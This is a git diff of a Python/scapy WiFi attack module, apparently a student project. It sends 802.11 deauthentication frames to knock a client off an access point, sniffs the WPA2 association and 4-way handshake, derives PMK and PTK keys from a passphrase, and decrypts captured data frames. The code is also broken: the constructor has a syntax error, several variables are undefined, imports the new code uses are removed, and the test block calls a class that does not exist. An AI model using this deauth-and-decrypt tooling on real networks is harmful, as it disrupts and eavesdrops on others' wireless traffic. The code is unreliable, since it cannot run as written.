@@ -1,72 +1,127 @@
-#capture module
-import threading
-import os
-import time
-import random
 from scapy.all import *
-import hmac
-from binascii import a2b_hex, b2a_hex
-from hashlib import pbkdf2_hmac, sha1, md5
-from Crypto.Cipher import AES
-import struct
 
-
-class WPA2:
-    def __init__(self, apMac, staMac, aNonce, sNonce, ssid):
-        self.apMac = apMac
-        self.staMac = staMac
-        self.aNonce = aNonce
-        self.sNonce = sNonce
+    
+class Capturemodule:
+    
+    def __init__(self, APmac, STAmac, ,ssid, pw, interface):
+        self.APmac = APmac
+        self.STAmac = STAmac
         self.ssid = ssid
+        self.pw = pw
+        self.interface = interface
+        self.encryption = ""
+        self.status = 0
+        """
+        Bits 1 authentication request
+        Bits 2 authentication response
+        Bits 4 association request
+        Bits 8 association response
+        Bits 16 key_ex1_done
+        Bits 32 key_ex2_done
+        Bits 64 key_ex3_done
+        Bits 128 key_ex4_done
+        """
     
-    def apMac(self):
-        return self.apMac
-    
-    def staMac(self):
-        return self.staMac
-    
-    def aNonce(self):
-        return self.aNonce
-    
-    def sNonce(self):
-        return self.sNonce
-    
-    def ssid(self):
-        return self.ssid
-    
-
-class capturemodule():
-    
-    F_nonces = []
-    
-    def deauth(self, staMac, apMac, iface):
-        dot11 = Dot11(addr1=staMac, addr2=apMac, addr3=apMac)
+    def deauth(self):
+        dot11 = Dot11(addr1= self.STAmac, addr2= self.APmac, addr3= self.APmac)
         packet = RadioTap()/dot11/Dot11Deauth(reason=7)
-        sendp(packet, count=1, iface=iface, verbose=1)
+        sendp(packet, count=1, iface= self.interface, verbose=1)
+        
+    def packet_sniff(self):
+        sniff(iface=self.interface, prn=self.mac_filter, filter=f'ether host {self.APmac} or ether host {self.STAmac}')
 
-    def getnonce(self, pkt) :
-        if pkt.haslayer(EAPOL) and pkt.getlayer(EAPOL).type == 3 :
-            eapol = pkt.getlayer(EAPOL)
-            self.F_nonces.append(bytes(eapol)[0x11:0x11 + 0x20])
-        
-    def capture4way(self, staMac, apMac, iface, ch, sec) :
-        try:
-            thread = threading.Thread(target = self.deauth, args=(staMac, apMac, iface, ))
-            thread.daemon = True
-            thread.start()
-            
-            os.system('iwconfig %s channel %d' % (iface, ch))
-            sniff(iface=iface, prn=self.getnonce, timeout=sec)
-        
-        except Exception as e: # False Case 1 [Hopper or Sniff Failed]
-            print(" [*] Error : ", e)
-            return False
+    def mac_filter(self, pkt):
+        dot11header = pkt.getlayer(Dot11)
+        pool = set()
+        pool.add(pkt.addr1)
+        pool.add(pkt.addr2)
+        pool.add(pkt.addr3)
+        # print("  [-] Debug : mac_filter", self.APmac in pool, self.STAmac in pool)
 
-        finally:
-            self.stop_hopper = True
+        if self.APmac in pool and self.STAmac in pool:
+            self.sort_packet(pkt)
+
+    def sort_packet(self, pkt):
+        dot11header = pkt.getlayer(Dot11)
+        if dot11header.type == 0:  # type : Management(0)
+            if dot11header.subtype == 11:  # subtype : Authentication(11)
+                self.authentication(pkt)
+            if dot11header.subtype == 0:  # subtype : Association Request(0)
+                self.association_request(pkt)
+            elif dot11header.subtype == 1:  # subtype : Association Response(1)
+                self.association_response(pkt)
+        elif dot11header.type == 2:
+            if int(dot11header.FCfield) & 64 == 0:  # flag Protected not set : EAPOL key change
+                self.eapol_keychange(pkt)
+            else:  # flag Protected set : Data Packet(encrypted)
+                self.collect_data(pkt)
+
+    def authentication(self, pkt):
+        auth = pkt.getlayer(Dot11Auth)
+        if auth.algo == 0:
+            if auth.seqnum == 1 and auth.status == 0:  # Authentication Request
+                self.status |= 1
+                print(" [*] Authentication Request")
+            elif auth.seqnum == 2 and auth.status == 0:  # Authentication Response
+                self.status |= 2
+                print(" [*] Authentication Response")
+
+    def association_request(self, pkt):
+        if self.status & 3 != 3:  # Flag not set
+            print(" [-] Packet Order Wrong... at association_request")
+            raise Exception
+        if pkt.haslayer(Dot11EltRSN):
+            self.encryption = "WPA2"
+            print(" [*] Association Request : WPA2")
+        elif pkt.haslayer(Dot11EltMicrosoftWPA):
+            self.encryption = "WPA"
+            print(" [*] Association Request : WPA")
+        else:
+            self.encryption = "OPEN"
+            print(" [*] Association Request : OPEN")
+        self.status |= 4
+
+    def association_response(self, pkt):
+        if self.status & 7 != 7:  # Flag not set
+            print(" [-] Packet Order Wrong... at association_response")
+            raise Exception
+        if pkt.getlayer(Dot11AssoResp).status == 0:  # status 0 : success
+            self.status |= 8
+            print(" [*] Association Response")
+
+    def eapol_keychange(self, pkt):
+        print(" [*] EAPOL key change")
+
+        p = getptk()
+        p.getnonce(pkt)
         
-    # F_nonces[0], F_nonces[1] = aNonce, sNonce
-    
+        anonce = p.F_nonces[0]
+        snonce = p.F_nonces[1]
+        
+        ap_mac = binascii.a2b_hex(self.APmac.replace(":", ""))
+        sta_mac = binascii.a2b_hex(self.STAmac.replace(":", ""))
+
+        A, B = p.MakeAB(anonce, snonce, ap_mac, s_mac)
+        pmk = p.makePMK(pw, ssid)
+        p.ptk = p.makePTK(pmk, A, B)
+        pass
+
+    def collect_data(self, pkt):
+        print(" [*] Collecting data")
+        d = WPA2DecryptionBox(pkt, p.ptk)
+        d.save_packet()
+        
+        pass
+
+
+class getptk():
+    F_nonces = []
+    ptk = b''
+
+    def getnonce(self, pkt):
+        eapol = pkt.getlayer(EAPOL)
+        self.F_nonces.append(bytes(eapol)[0x11:0x11 + 0x20])
+
     def PRF(self, key, A, B):
         # Number of bytes in the PTK
         nByte = 64
@@ -79,21 +134,19 @@ class capturemodule():
             i += 1
         return R[0:nByte]
 
-
     def MakeAB(self, aNonce, sNonce, apMac, cliMac):
         A = b"Pairwise key expansion"
         B = min(apMac, cliMac) + max(apMac, cliMac) + min(aNonce, sNonce) + max(aNonce, sNonce)
         return (A, B)
 
-
     def makePMK(self, pwd, ssid):
         pmk = pbkdf2_hmac('sha1', pwd.encode('ascii'), ssid.encode('ascii'), 4096, 32)
         return pmk
 
-
     def makePTK(self, pmk, A, B):
         ptk = self.PRF(pmk, A, B)
         return ptk
+
 
 class WPA2DecryptionBox:
     def __init__(self, pkt, tk_key):
@@ -144,19 +197,9 @@ class WPA2DecryptionBox:
 
 
 '''if __name__ == '__main__':
-    sample = PcapReader("/home/hunjison/Desktop/CRGWiFi/wpa-Induction.pcap")
+    # Just For test.... Packet capture is too hard...
+    sample = PcapReader("/home/hunjison/Desktop/CRGWiFi/wpa-Induction.pcap")  # Pcap From Wireshark
     pkt_list = sample.read_all()
-    tk_key = b'\x00' * 16
-
-    idx = 0
-    for idx in range(len(pkt_list)):
-        pkt = pkt_list[idx]
-        if pkt.getlayer(Dot11CCMP):
-            if pkt.getlayer(Dot11).type == 2:
-                # print("pkt select done! : number = ", idx)
-                wpa2decryptionbox = WPA2DecryptionBox(pkt, tk_key)
-
-                break
-
-    wpa2decryptionbox.save_packet()
-    print('done!')'''
+    capturemodule = Capture('00:0d:93:82:36:3a', '00:0c:41:82:b2:55', 'iptime')
+    for pkt in pkt_list:
+        capturemodule.mac_filter(pkt)'''
